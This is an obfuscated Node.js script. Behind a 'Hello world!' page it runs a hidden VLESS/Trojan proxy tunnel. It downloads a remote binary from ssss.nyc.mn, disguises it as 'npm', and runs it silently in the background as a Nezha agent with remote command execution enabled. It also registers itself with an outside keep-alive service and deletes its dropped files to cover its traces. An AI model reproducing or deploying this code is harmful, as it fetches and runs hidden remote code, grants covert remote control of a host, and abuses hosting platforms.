const _0xdc28c7=_0x2a62;function _0x2a62(_0x3b81d1,_0x287302){const _0x18b66a=_0x18b6();return _0x2a62=function(_0x2a6209,_0x56ae4d){_0x2a6209=_0x2a6209-0x149;let _0x315fa1=_0x18b66a[_0x2a6209];return _0x315fa1;},_0x2a62(_0x3b81d1,_0x287302);}(function(_0x1f6f9b,_0x55ea66){const _0x17c0db=_0x2a62,_0x4bf292=_0x1f6f9b();while(!![]){try{const _0x326295=-parseInt(_0x17c0db(0x1b0))/0x1+-parseInt(_0x17c0db(0x176))/0x2*(parseInt(_0x17c0db(0x1b6))/0x3)+-parseInt(_0x17c0db(0x14f))/0x4+-parseInt(_0x17c0db(0x187))/0x5+parseInt(_0x17c0db(0x1a5))/0x6+parseInt(_0x17c0db(0x168))/0x7*(-parseInt(_0x17c0db(0x199))/0x8)+parseInt(_0x17c0db(0x1b8))/0x9*(parseInt(_0x17c0db(0x18d))/0xa);if(_0x326295===_0x55ea66)break;else _0x4bf292['push'](_0x4bf292['shift']());}catch(_0x2881d7){_0x4bf292['push'](_0x4bf292['shift']());}}}(_0x18b6,0x88e01));const os=require('os'),http=require(_0xdc28c7(0x16b)),fs=require('fs'),axios=require('axios'),net=require(_0xdc28c7(0x172)),path=require(_0xdc28c7(0x193)),crypto=require(_0xdc28c7(0x162)),{Buffer}=require('buffer'),{exec,execSync}=require(_0xdc28c7(0x164)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0xdc28c7(0x1ac)]||'857875fc-6178-4059-a2bf-ed4a1c946e2d',NEZHA_SERVER=process[_0xdc28c7(0x1b3)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xdc28c7(0x1b3)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0xdc28c7(0x188)]||'',DOMAIN=process[_0xdc28c7(0x1b3)]['DOMAIN']||_0xdc28c7(0x169),AUTO_ACCESS=process[_0xdc28c7(0x1b3)][_0xdc28c7(0x157)]||!![],WSPATH=process[_0xdc28c7(0x1b3)][_0xdc28c7(0x179)]||UUID[_0xdc28c7(0x1c6)](0x0,0x8),SUB_PATH=process[_0xdc28c7(0x1b3)][_0xdc28c7(0x153)]||_0xdc28c7(0x151),NAME=process[_0xdc28c7(0x1b3)][_0xdc28c7(0x15e)]||_0xdc28c7(0x17f),PORT=process['env'][_0xdc28c7(0x1b4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3884b6=_0xdc28c7;try{const _0x3ee796=await axios['get'](_0x3884b6(0x19b)),_0x4bffe5=_0x3ee796[_0x3884b6(0x15a)];ISP=(_0x4bffe5[_0x3884b6(0x186)]+'-'+_0x4bffe5[_0x3884b6(0x166)])[_0x3884b6(0x198)](/ /g,'_');}catch(_0x2e4e66){ISP=_0x3884b6(0x149);}};GetISP();const httpServer=http[_0xdc28c7(0x17d)]((_0x17e394,_0x16d3b6)=>{const _0x6fd625=_0xdc28c7;if(_0x17e394[_0x6fd625(0x18a)]==='/'){const _0x5e747f=path[_0x6fd625(0x16d)](__dirname,_0x6fd625(0x19a));fs[_0x6fd625(0x1c3)](_0x5e747f,'utf8',(_0x2aa54e,_0x4b44bb)=>{const _0x2f8602=_0x6fd625;if(_0x2aa54e){_0x16d3b6[_0x2f8602(0x1a0)](0xc8,{'Content-Type':_0x2f8602(0x159)}),_0x16d3b6[_0x2f8602(0x1a3)](_0x2f8602(0x1a8));return;}_0x16d3b6[_0x2f8602(0x1a0)](0xc8,{'Content-Type':'text/html'}),_0x16d3b6['end'](_0x4b44bb);});return;}else{if(_0x17e394[_0x6fd625(0x18a)]==='/'+SUB_PATH){const _0x215edc=_0x6fd625(0x17b)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x6fd625(0x182)+WSPATH+'#'+NAME+'-'+ISP,_0xad2e7c=_0x6fd625(0x1c4)+UUID+'@'+DOMAIN+_0x6fd625(0x165)+DOMAIN+_0x6fd625(0x167)+DOMAIN+_0x6fd625(0x182)+WSPATH+'#'+NAME+'-'+ISP,_0x544772=_0x215edc+'\x0a'+_0xad2e7c,_0x30b116=Buffer[_0x6fd625(0x14d)](_0x544772)['toString'](_0x6fd625(0x197));_0x16d3b6[_0x6fd625(0x1a0)](0xc8,{'Content-Type':_0x6fd625(0x1ab)}),_0x16d3b6[_0x6fd625(0x1a3)](_0x30b116+'\x0a');}else _0x16d3b6[_0x6fd625(0x1a0)](0x194,{'Content-Type':_0x6fd625(0x1ab)}),_0x16d3b6['end'](_0x6fd625(0x195));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x9fbed0){return new Promise((_0x4b916a,_0x243fcc)=>{const _0x4199b6=_0x2a62;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4199b6(0x1a2)](_0x9fbed0)){_0x4b916a(_0x9fbed0);return;}let _0x264a9b=0x0;function _0x1a2378(){const _0xb64f76=_0x4199b6;if(_0x264a9b>=DNS_SERVERS[_0xb64f76(0x192)]){_0x243fcc(new Error('Failed\x20to\x20resolve\x20'+_0x9fbed0+_0xb64f76(0x160)));return;}const _0x44a1a1=DNS_SERVERS[_0x264a9b];_0x264a9b++;const _0x2b7ff0=_0xb64f76(0x18c)+encodeURIComponent(_0x9fbed0)+_0xb64f76(0x1aa);axios[_0xb64f76(0x1a7)](_0x2b7ff0,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x593a3b=>{const _0x2f03ba=_0xb64f76,_0x3295a5=_0x593a3b[_0x2f03ba(0x15a)];if(_0x3295a5[_0x2f03ba(0x15d)]===0x0&&_0x3295a5['Answer']&&_0x3295a5[_0x2f03ba(0x1b7)]['length']>0x0){const _0x5ad575=_0x3295a5['Answer'][_0x2f03ba(0x1b9)](_0x2a7568=>_0x2a7568[_0x2f03ba(0x16a)]===0x1);if(_0x5ad575){_0x4b916a(_0x5ad575['data']);return;}}_0x1a2378();})[_0xb64f76(0x19c)](_0x45c854=>{_0x1a2378();});}_0x1a2378();});}function handleVlessConnection(_0xce3b39,_0x52fc4a){const _0x5db24e=_0xdc28c7,[_0x3e8475]=_0x52fc4a,_0x51b619=_0x52fc4a['slice'](0x1,0x11);if(!_0x51b619[_0x5db24e(0x1ae)]((_0x3c4376,_0x17f0e9)=>_0x3c4376==parseInt(uuid[_0x5db24e(0x1ad)](_0x17f0e9*0x2,0x2),0x10)))return![];let _0x54f661=_0x52fc4a['slice'](0x11,0x12)[_0x5db24e(0x185)]()+0x13;const _0x1ac744=_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661,_0x54f661+=0x2)[_0x5db24e(0x174)](0x0),_0x278e19=_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661,_0x54f661+=0x1)[_0x5db24e(0x185)](),_0x36e0be=_0x278e19==0x1?_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661,_0x54f661+=0x4)[_0x5db24e(0x16d)]('.'):_0x278e19==0x2?new TextDecoder()[_0x5db24e(0x191)](_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661+0x1,_0x54f661+=0x1+_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661,_0x54f661+0x1)['readUInt8']())):_0x278e19==0x3?_0x52fc4a[_0x5db24e(0x1c6)](_0x54f661,_0x54f661+=0x10)[_0x5db24e(0x1b1)]((_0x29d0ce,_0x223c87,_0x2f5e72,_0x776f2e)=>_0x2f5e72%0x2?_0x29d0ce[_0x5db24e(0x178)](_0x776f2e['slice'](_0x2f5e72-0x1,_0x2f5e72+0x1)):_0x29d0ce,[])[_0x5db24e(0x15f)](_0x88e5e4=>_0x88e5e4[_0x5db24e(0x174)](0x0)[_0x5db24e(0x1a1)](0x10))['join'](':'):'';_0xce3b39[_0x5db24e(0x189)](new Uint8Array([_0x3e8475,0x0]));const _0x4a3c61=createWebSocketStream(_0xce3b39);return resolveHost(_0x36e0be)[_0x5db24e(0x173)](_0x1b22b9=>{const _0x5b9965=_0x5db24e;net[_0x5b9965(0x1b5)]({'host':_0x1b22b9,'port':_0x1ac744},function(){const _0x5947fc=_0x5b9965;this[_0x5947fc(0x1c5)](_0x52fc4a[_0x5947fc(0x1c6)](_0x54f661)),_0x4a3c61['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x4a3c61);})['on'](_0x5b9965(0x14c),()=>{});})[_0x5db24e(0x19c)](_0x2809c4=>{const _0x580630=_0x5db24e;net['connect']({'host':_0x36e0be,'port':_0x1ac744},function(){const _0x4beafb=_0x2a62;this[_0x4beafb(0x1c5)](_0x52fc4a['slice'](_0x54f661)),_0x4a3c61['on'](_0x4beafb(0x14c),()=>{})[_0x4beafb(0x150)](this)['on'](_0x4beafb(0x14c),()=>{})['pipe'](_0x4a3c61);})['on'](_0x580630(0x14c),()=>{});}),!![];}function handleTrojanConnection(_0x2e5468,_0x597bd6){const _0x1c720f=_0xdc28c7;try{if(_0x597bd6[_0x1c720f(0x192)]<0x3a)return![];const _0x1d607b=_0x597bd6[_0x1c720f(0x1c6)](0x0,0x38)[_0x1c720f(0x1a1)](),_0x27db9b=[UUID];let _0x147bef=null;for(const _0x21f1cb of _0x27db9b){const _0x208a0e=crypto[_0x1c720f(0x184)]('sha224')[_0x1c720f(0x18b)](_0x21f1cb)[_0x1c720f(0x163)](_0x1c720f(0x152));if(_0x208a0e===_0x1d607b){_0x147bef=_0x21f1cb;break;}}if(!_0x147bef)return![];let _0x3de11d=0x38;_0x597bd6[_0x3de11d]===0xd&&_0x597bd6[_0x3de11d+0x1]===0xa&&(_0x3de11d+=0x2);const _0x1dd43c=_0x597bd6[_0x3de11d];if(_0x1dd43c!==0x1)return![];_0x3de11d+=0x1;const _0x44baaa=_0x597bd6[_0x3de11d];_0x3de11d+=0x1;let _0x42cb22,_0x28cdd2;if(_0x44baaa===0x1)_0x42cb22=_0x597bd6['slice'](_0x3de11d,_0x3de11d+0x4)[_0x1c720f(0x16d)]('.'),_0x3de11d+=0x4;else{if(_0x44baaa===0x3){const _0x5c6b53=_0x597bd6[_0x3de11d];_0x3de11d+=0x1,_0x42cb22=_0x597bd6[_0x1c720f(0x1c6)](_0x3de11d,_0x3de11d+_0x5c6b53)[_0x1c720f(0x1a1)](),_0x3de11d+=_0x5c6b53;}else{if(_0x44baaa===0x4)_0x42cb22=_0x597bd6[_0x1c720f(0x1c6)](_0x3de11d,_0x3de11d+0x10)[_0x1c720f(0x1b1)]((_0x1d6e18,_0x422e92,_0x37df52,_0x12ac55)=>_0x37df52%0x2?_0x1d6e18[_0x1c720f(0x178)](_0x12ac55[_0x1c720f(0x1c6)](_0x37df52-0x1,_0x37df52+0x1)):_0x1d6e18,[])[_0x1c720f(0x15f)](_0xf40e0e=>_0xf40e0e['readUInt16BE'](0x0)[_0x1c720f(0x1a1)](0x10))['join'](':'),_0x3de11d+=0x10;else return![];}}_0x28cdd2=_0x597bd6[_0x1c720f(0x174)](_0x3de11d),_0x3de11d+=0x2;_0x3de11d<_0x597bd6[_0x1c720f(0x192)]&&_0x597bd6[_0x3de11d]===0xd&&_0x597bd6[_0x3de11d+0x1]===0xa&&(_0x3de11d+=0x2);const _0x33d8a4=createWebSocketStream(_0x2e5468);return resolveHost(_0x42cb22)[_0x1c720f(0x173)](_0x13b976=>{const _0x55a46d=_0x1c720f;net['connect']({'host':_0x13b976,'port':_0x28cdd2},function(){const _0x5adf9b=_0x2a62;_0x3de11d<_0x597bd6[_0x5adf9b(0x192)]&&this['write'](_0x597bd6['slice'](_0x3de11d)),_0x33d8a4['on'](_0x5adf9b(0x14c),()=>{})[_0x5adf9b(0x150)](this)['on'](_0x5adf9b(0x14c),()=>{})[_0x5adf9b(0x150)](_0x33d8a4);})['on'](_0x55a46d(0x14c),()=>{});})[_0x1c720f(0x19c)](_0x51ddbc=>{const _0x717340=_0x1c720f;net[_0x717340(0x1b5)]({'host':_0x42cb22,'port':_0x28cdd2},function(){const _0x299a9d=_0x717340;_0x3de11d<_0x597bd6[_0x299a9d(0x192)]&&this[_0x299a9d(0x1c5)](_0x597bd6[_0x299a9d(0x1c6)](_0x3de11d)),_0x33d8a4['on'](_0x299a9d(0x14c),()=>{})[_0x299a9d(0x150)](this)['on'](_0x299a9d(0x14c),()=>{})[_0x299a9d(0x150)](_0x33d8a4);})['on'](_0x717340(0x14c),()=>{});}),!![];}catch(_0x31632a){return![];}}wss['on'](_0xdc28c7(0x16c),(_0x19850a,_0x20442f)=>{const _0x148d02=_0xdc28c7,_0x2b9529=_0x20442f['url']||'';_0x19850a['once'](_0x148d02(0x1bf),_0x54034e=>{const _0x2d39fa=_0x148d02;if(_0x54034e['length']>0x11&&_0x54034e[0x0]===0x0){const _0x3b13df=_0x54034e[_0x2d39fa(0x1c6)](0x1,0x11),_0x16b086=_0x3b13df['every']((_0x272d3c,_0x438429)=>_0x272d3c==parseInt(uuid['substr'](_0x438429*0x2,0x2),0x10));if(_0x16b086){!handleVlessConnection(_0x19850a,_0x54034e)&&_0x19850a[_0x2d39fa(0x1b2)]();return;}}!handleTrojanConnection(_0x19850a,_0x54034e)&&_0x19850a[_0x2d39fa(0x1b2)]();})['on'](_0x148d02(0x14c),()=>{});});const getDownloadUrl=()=>{const _0x56a692=_0xdc28c7,_0x26b175=os[_0x56a692(0x1bc)]();return _0x26b175===_0x56a692(0x19e)||_0x26b175==='arm64'||_0x26b175===_0x56a692(0x190)?!NEZHA_PORT?_0x56a692(0x1c8):_0x56a692(0x1c0):!NEZHA_PORT?_0x56a692(0x17a):_0x56a692(0x1a6);},downloadFile=async()=>{const _0x4da401=_0xdc28c7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x89cf50=getDownloadUrl(),_0xe9bd64=await axios({'method':_0x4da401(0x1a7),'url':_0x89cf50,'responseType':_0x4da401(0x177)}),_0x26d9d2=fs[_0x4da401(0x161)](_0x4da401(0x14b));return _0xe9bd64[_0x4da401(0x15a)][_0x4da401(0x150)](_0x26d9d2),new Promise((_0x5ddc86,_0x37d340)=>{const _0x2a4a0d=_0x4da401;_0x26d9d2['on'](_0x2a4a0d(0x19d),()=>{const _0x507396=_0x2a4a0d;console['log'](_0x507396(0x16f)),exec('chmod\x20+x\x20npm',_0x45d055=>{if(_0x45d055)_0x37d340(_0x45d055);_0x5ddc86();});}),_0x26d9d2['on']('error',_0x37d340);});}catch(_0x3b46d9){throw _0x3b46d9;}},runnz=async()=>{const _0x180827=_0xdc28c7;try{const _0x1a3cba=execSync(_0x180827(0x17c),{'encoding':_0x180827(0x15b)});if(_0x1a3cba['trim']()!==''){console[_0x180827(0x16e)](_0x180827(0x158));return;}}catch(_0x932e44){}await downloadFile();let _0x2d0978='',_0x44275a=[_0x180827(0x1a9),'8443',_0x180827(0x1bd),_0x180827(0x19f),_0x180827(0x156),_0x180827(0x196)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x36a122=_0x44275a['includes'](NEZHA_PORT)?_0x180827(0x1be):'';_0x2d0978=_0x180827(0x15c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x180827(0x18e)+NEZHA_KEY+'\x20'+_0x36a122+_0x180827(0x1bb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x41e622=NEZHA_SERVER[_0x180827(0x14e)](':')?NEZHA_SERVER[_0x180827(0x154)](':')[_0x180827(0x18f)]():'',_0x8563c5=_0x44275a[_0x180827(0x14e)](_0x41e622)?'true':_0x180827(0x1a4),_0x77835f='client_secret:\x20'+NEZHA_KEY+_0x180827(0x14a)+NEZHA_SERVER+_0x180827(0x1af)+_0x8563c5+_0x180827(0x1c7)+UUID;fs[_0x180827(0x155)](_0x180827(0x194),_0x77835f);}_0x2d0978='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2d0978,{'shell':_0x180827(0x17e)},_0x3e2e05=>{const _0x3741f8=_0x180827;if(_0x3e2e05)console[_0x3741f8(0x14c)](_0x3741f8(0x170),_0x3e2e05);else console[_0x3741f8(0x16e)](_0x3741f8(0x183));});}catch(_0x3d3962){console['error']('error:\x20'+_0x3d3962);}};async function addAccessTask(){const _0xaaf646=_0xdc28c7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x597eae=_0xaaf646(0x180)+DOMAIN;try{const _0x100103=await axios['post'](_0xaaf646(0x1c2),{'url':_0x597eae},{'headers':{'Content-Type':_0xaaf646(0x171)}});console[_0xaaf646(0x16e)](_0xaaf646(0x1ba));}catch(_0x249197){}}const delFiles=()=>{const _0x1211a4=_0xdc28c7;fs[_0x1211a4(0x181)](_0x1211a4(0x14b),()=>{}),fs[_0x1211a4(0x181)](_0x1211a4(0x194),()=>{});};function _0x18b6(){const _0x25311e=['utf-8','setsid\x20nohup\x20./npm\x20-s\x20','Status','NAME','map','\x20with\x20all\x20DNS\x20servers','createWriteStream','crypto','digest','child_process',':443?security=tls&sni=','asOrganization','&fp=chrome&type=ws&host=','679kFegwy','1234.abc.com','type','http','connection','join','log','npm\x20download\x20successfully','npm\x20running\x20error:','application/json','net','then','readUInt16BE','Server\x20is\x20running\x20on\x20port\x20','32402LodYcd','stream','concat','WSPATH','https://amd64.ssss.nyc.mn/v1','vless://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','createServer','/bin/bash','Hug','https://','unlink','&path=%2F','npm\x20is\x20running','createHash','readUInt8','country','3521785avwAes','NEZHA_KEY','send','url','update','https://dns.google/resolve?name=','23454160uvoSMq','\x20-p\x20','pop','aarch64','decode','length','path','config.yaml','Not\x20Found\x0a','2053','base64','replace','21304uRwtMD','index.html','https://speed.cloudflare.com/meta','catch','finish','arm','2087','writeHead','toString','test','end','false','3385188SlhRzQ','https://amd64.ssss.nyc.mn/agent','get','Hello\x20world!','443','&type=A','text/plain','UUID','substr','every','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','649798RzyiUB','reduce','close','env','PORT','connect','33MPlBLa','Answer','9ExnmXi','find','Automatic\x20Access\x20Task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arch','2096','--tls','message','https://arm64.ssss.nyc.mn/agent','listen','https://oooo.serv00.net/add-url','readFile','trojan://','write','slice','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/v1','Unknown','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm','error','from','includes','2233184BpTSBY','pipe','857875fc','hex','SUB_PATH','split','writeFileSync','2083','AUTO_ACCESS','npm\x20is\x20already\x20running,\x20skip\x20running...','text/html','data'];_0x18b6=function(){return _0x25311e;};return _0x18b6();}httpServer[_0xdc28c7(0x1c1)](PORT,()=>{const _0x9e25c8=_0xdc28c7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x9e25c8(0x16e)](_0x9e25c8(0x175)+PORT);});
